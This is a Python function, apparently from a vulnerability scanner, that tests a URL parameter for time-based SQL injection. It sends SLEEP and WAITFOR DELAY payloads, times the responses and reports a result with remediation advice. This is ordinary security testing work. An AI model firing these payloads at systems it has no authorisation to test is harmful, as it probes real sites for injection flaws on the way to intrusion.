import time
from models import ExploitResult
from utils import normalize_url, http

async def test_sql_injection(target: str, parameter: str) -> str:
    """
    Test specific parameter for time-based SQL injection (safe, non-destructive).
    
    Args:
        target: Target URL
        parameter: Query parameter to test (e.g., 'id', 'page', 'cat')
    
    Returns:
        JSON with vulnerability status, payload used, and delay time
    """
    base = normalize_url(target)
    
    # Time-based payloads
    payloads = [
        f"1' AND (SELECT * FROM (SELECT(SLEEP(5)))a)-- -",
        f"1 AND SLEEP(5)",
        f"1'; WAITFOR DELAY '0:0:5'--",
    ]
    
    for payload in payloads:
        url = f"{base}?{parameter}={payload}"
        start = time.time()
        
        try:
            await http.get(url)
            elapsed = time.time() - start
            
            if elapsed > 4.5:
                result = ExploitResult(
                    vulnerable=True,
                    vulnerability_type="SQL Injection (Time-based)",
                    severity="Critical",
                    confidence="Confirmed",
                    proof_of_concept=url,
                    extracted_data=f"Response delayed {elapsed:.2f}s",
                    remediation="Use parameterized queries. Sanitize all user input.",
                    cvss_score=9.8
                )
                return result.model_dump_json(indent=2)
        except:
            continue
    
    return ExploitResult(
        vulnerable=False,
        vulnerability_type="SQL Injection",
        severity="None",
        confidence="Not Found",
        proof_of_concept="",
        remediation="N/A",
        cvss_score=0.0
    ).model_dump_json(indent=2)
